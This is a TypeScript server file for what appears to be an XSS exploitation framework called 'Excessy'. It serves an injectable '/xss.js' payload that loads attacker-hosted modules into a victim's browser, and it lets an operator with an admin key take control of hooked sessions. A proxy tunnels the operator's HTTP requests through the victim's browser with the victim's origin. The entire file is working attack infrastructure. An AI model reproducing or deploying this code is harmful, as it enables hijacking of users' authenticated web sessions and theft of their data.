import express, { Request, Response } from 'express';
import { createServer } from 'http';
import { Server, Socket } from 'socket.io';
import crypto from 'crypto';
import { URL } from 'url';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs/promises';
import { Session, ProxyRequest, ProxyResponse, SocketMessage, XSSModule } from './types/index.js';

// ES module compatibility
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const proxySessions: Record<string, SessionManager> = {};
const sessions: SessionManager[] = [];
const ADMIN_KEY = crypto.randomBytes(16).toString('hex');
const HTTP_PORT = 3000;
const PROXY_PORT = 8888;

class SessionManager implements Session {
  public id: string;
  public origin: string;
  public adminSocketId?: string;
  public clientSocketId?: string;
  private resolves: Record<string, (response: ProxyResponse) => void> = {};

  constructor(id: string, origin: string) {
    this.id = id;
    this.origin = origin;
  }

  setAdminSocket(socketId: string): void {
    if (this.adminSocketId) {
      const oldSocket = io.sockets.sockets.get(this.adminSocketId);
      if (oldSocket && oldSocket.connected) {
        oldSocket.disconnect();
      }
    }
    this.adminSocketId = socketId;
    this.sendToAdmin({ type: 'connected' });
  }

  setClientSocket(socketId: string): void {
    if (this.clientSocketId) {
      const oldSocket = io.sockets.sockets.get(this.clientSocketId);
      if (oldSocket && oldSocket.connected) {
        oldSocket.disconnect();
      }
    }
    this.clientSocketId = socketId;
  }

  sendToAdmin(message: SocketMessage): void {
    if (this.adminSocketId) {
      const socket = io.sockets.sockets.get(this.adminSocketId);
      if (socket && socket.connected) {
        socket.emit('message', message);
      }
    }
  }

  sendToClient(message: SocketMessage): void {
    if (this.clientSocketId) {
      const socket = io.sockets.sockets.get(this.clientSocketId);
      if (socket && socket.connected) {
        socket.emit('message', message);
      }
    }
  }

  handleMessage(message: SocketMessage, fromAdmin: boolean): void {
    if (message.type === 'ping') {
      const socket = fromAdmin 
        ? io.sockets.sockets.get(this.adminSocketId!)
        : io.sockets.sockets.get(this.clientSocketId!);
      
      if (socket) {
        socket.emit('message', { type: 'pong' });
      }
      return;
    }

    if (message.type === 'response' && 'id' in message) {
      const resolver = this.resolves[message.id];
      if (resolver && 'response' in message) {
        resolver(message.response as ProxyResponse);
        delete this.resolves[message.id];
      }
      return;
    }

    // Forward message between admin and client
    if (fromAdmin) {
      this.sendToClient(message);
    } else {
      this.sendToAdmin(message);
    }
  }

  sendRequest(url: string, headers: Record<string, string>, method: string, body: string): Promise<ProxyResponse> {
    return new Promise((resolve) => {
      const id = 'req' + Math.random().toString().slice(2);
      this.resolves[id] = resolve;

      this.sendToClient({
        type: 'request',
        url,
        headers,
        method,
        body,
        id
      });
    });
  }
}

class SessionsContainer {
  static createSession(origin: string): SessionManager {
    const sessionId = crypto.randomBytes(6).toString('hex');
    const session = new SessionManager(sessionId, origin);
    sessions.push(session);
    return session;
  }

  static hasSession(sessionId: string): boolean {
    return sessions.some(s => s.id === sessionId);
  }

  static getSession(sessionId: string): SessionManager | undefined {
    return sessions.find(s => s.id === sessionId);
  }

  static getSessionsInfo() {
    return sessions.map(s => ({
      id: s.id,
      origin: s.origin,
      isAnyAdmin: s.adminSocketId !== undefined
    }));
  }
}

async function sendRequestViaVictim(url: string, headers: Record<string, string>, method: string, body: string): Promise<ProxyResponse> {
  const urlData = new URL(url);
  const session = proxySessions[urlData.origin];
  
  if (!session) {
    return {
      status: 200,
      statusText: 'OK',
      headers: { 'Connection': 'close' },
      body: '41414141'
    };
  } else {
    const response = await session.sendRequest(url, headers, method, body);
    const responseHeaders: Record<string, string> = {};

    for (const [name, value] of Object.entries(response.headers)) {
      if (name === 'content-encoding') {
        continue;
      } else if (name === 'content-length') {
        responseHeaders[name] = Math.floor(response.body.length / 2).toString();
      } else {
        responseHeaders[name] = value;
      }
    }

    return {
      ...response,
      headers: responseHeaders
    };
  }
}

// Proxy server
const proxyServer = createServer((req, res) => {
  const { url, headers, method } = req;
  let body: Buffer[] = [];

  req.on('data', chunk => {
    body.push(chunk);
  }).on('end', async () => {
    const bodyHex = Buffer.concat(body).toString('hex');
    
    const victimResponse = await sendRequestViaVictim(
      url!, 
      headers as Record<string, string>, 
      method!, 
      bodyHex
    );
    
    res.writeHead(victimResponse.status, victimResponse.statusText, victimResponse.headers);
    res.write(Buffer.from(victimResponse.body, 'hex'));
    res.end();
  });
});

// Routes
app.get('/check-admin-key', (req: Request, res: Response) => {
  const adminKey = req.header('X-Admin-Key');
  if (adminKey === ADMIN_KEY) {
    res.json({ status: 'ok' });
  } else {
    res.json({ status: 'err' });
  }
});

app.get('/xss.js', (req: Request, res: Response) => {
  const sessionId = crypto.randomBytes(6).toString('hex');
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    // XSS Payload for session ${sessionId}
    (() => {
      const script = document.createElement('script');
      script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
      script.onload = () => {
        const xssScript = document.createElement('script');
        xssScript.type = 'module';
        xssScript.src = '${req.protocol}://${req.get('host')}/dist/xss-payload.js?${sessionId}';
        document.head.appendChild(xssScript);
      };
      document.head.appendChild(script);
    })();
  `);
});

app.get('/modules', async (req: Request, res: Response) => {
  try {
    const modulesDir = path.join(__dirname, '..', 'public', 'dist', 'modules');
    const files = await fs.readdir(modulesDir);
    const modules = files
      .filter((file: string) => file.endsWith('.js'))
      .map((file: string) => file.replace('.js', ''));
    res.json(modules);
  } catch (error) {
    res.json([]);
  }
});

// Socket.IO connection handling
io.on('connection', (socket: Socket) => {
  console.log('Socket connected:', socket.id);

  socket.on('admin-connect', (data: { adminKey: string }) => {
    if (data.adminKey !== ADMIN_KEY) {
      socket.emit('error', { message: 'Invalid admin key' });
      return;
    }

    console.log('Admin connected');
    
    const sendSessionsInfo = () => {
      socket.emit('sessions', SessionsContainer.getSessionsInfo());
    };

    const interval = setInterval(sendSessionsInfo, 1000);
    sendSessionsInfo();

    socket.on('join-session', (sessionId: string) => {
      if (SessionsContainer.hasSession(sessionId)) {
        const session = SessionsContainer.getSession(sessionId)!;
        session.setAdminSocket(socket.id);
        clearInterval(interval);
      }
    });

    socket.on('disconnect', () => {
      clearInterval(interval);
    });
  });

  socket.on('victim-connect', (data: { origin: string }) => {
    console.log('Victim connected from origin:', data.origin);
    const session = SessionsContainer.createSession(data.origin);
    proxySessions[data.origin] = session;
    session.setClientSocket(socket.id);
  });

  socket.on('message', (message: SocketMessage) => {
    // Find which session this socket belongs to
    const session = sessions.find(s => 
      s.adminSocketId === socket.id || s.clientSocketId === socket.id
    );

    if (session) {
      const fromAdmin = session.adminSocketId === socket.id;
      session.handleMessage(message, fromAdmin);
    }
  });

  socket.on('disconnect', () => {
    console.log('Socket disconnected:', socket.id);
    
    // Clean up sessions
    sessions.forEach(session => {
      if (session.adminSocketId === socket.id) {
        delete (session as any).adminSocketId;
      }
      if (session.clientSocketId === socket.id) {
        delete (session as any).clientSocketId;
      }
    });

    // Remove from proxy sessions if needed
    Object.keys(proxySessions).forEach(origin => {
      if (proxySessions[origin]?.clientSocketId === socket.id) {
        delete proxySessions[origin];
      }
    });
  });
});

app.use(express.static('public'));

proxyServer.listen(PROXY_PORT);
server.listen(HTTP_PORT, () => {
  console.log(`\n\n      _____
     |  ___|
     | |____  _____ ___  ___ ___ _   _
     |  __\\ \\/ / __/ _ \\/ __/ __| | | |
     | |___>  < (_|  __/\\__ \\__ \\ |_| |
     \\____/_/\\_\\___\\___||___/___/\\__, |
                                  __/ |
                                 |___/\n\n`);
  console.log(`Your admin key is ${ADMIN_KEY}`);
  console.log(`The server listens at port ${HTTP_PORT}.`);
  console.log(`The proxy listens at port ${PROXY_PORT}.`);
});